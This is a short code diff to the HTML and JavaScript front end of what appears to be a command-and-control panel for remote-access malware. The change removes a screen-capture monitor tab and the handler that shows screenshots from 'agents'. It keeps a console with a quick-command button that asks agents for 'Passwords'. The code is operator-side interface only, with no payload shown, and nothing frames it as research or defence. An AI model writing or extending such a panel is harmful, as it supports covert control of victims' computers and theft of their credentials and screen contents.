@@ -86,24 +86,13 @@
 
             <div style="grid-column: 1/3;">
                 <div class="tab-nav">
-                    <button class="tab-link active" onclick="openTab(event, 'tab-monitor')">📺 Monitor</button>
-                    <button class="tab-link" onclick="openTab(event, 'tab-console')">📟 Console</button>
+                    <button class="tab-link active" onclick="openTab(event, 'tab-console')">📟 Console</button>
                     <button class="tab-link" onclick="openTab(event, 'tab-activity')">📂 Activity</button>
                 </div>
 
-                <div id="tab-monitor" class="tab-content active">
-                    <div class="monitor-frame">
-                        <img id="main-monitor"
-                            src="https://via.placeholder.com/1280x720/000000/00f2fe?text=Waiting+for+Signal"
-                            class="monitor-img">
-                        <div class="monitor-overlay">
-                            <button class="action-btn btn-large" onclick="sendQuickCmd('screen')">📸 CAPTURE
-                                SCREEN</button>
-                        </div>
-                    </div>
-                </div>
 
-                <div id="tab-console" class="tab-content">
+
+                <div id="tab-console" class="tab-content active">
                     <div class="action-grid">
                         <button class="action-btn" onclick="sendQuickCmd('passwords')">🔑
                             <span>Passwords</span></button>
@@ -206,11 +195,7 @@
             feed.prepend(entry);
         });
 
-        socket.on('new_screenshot', (data) => {
-            if (selectedAgent !== "ALL" && selectedAgent !== data.id) return;
-            mainMonitor.src = data.url;
-            lastAction.innerText = `Capture from ${data.id}`;
-        });
+
 
         input.addEventListener('keypress', async (e) => {
             if (e.key === 'Enter') {
